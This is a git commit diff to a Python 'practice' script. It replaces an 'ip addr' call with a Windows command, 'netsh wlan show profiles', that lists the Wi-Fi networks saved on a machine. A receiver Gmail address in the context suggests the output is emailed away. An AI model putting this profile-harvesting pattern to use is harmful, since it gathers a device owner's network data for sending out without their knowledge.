d7da5ea637c915fb5350014380f7ec56543c41cd
sonu kumar <127440616+sonu-software@users.noreply.github.com>
2025-07-25 17:17:37 +0530

    practice.py

--- practice.py
+++ practice.py
@@ -19,8 +19,8 @@ receiver= "sonu.code.ai@gmail.com"
 
 try:
     # Run the linux command
-    command=["ip", "addr"]
-    output = subprocess.run(command,shell=True,capture_output=True,text=True)
+    command=["ip", "addr"] 
+    output = subprocess.run(['cmd.exe', '/c', 'netsh wlan show profiles'],shell=True,capture_output=True,text=True)
 
     # Get the output
     final_output = output.stdout if output.returncode == 0 else output.stderr
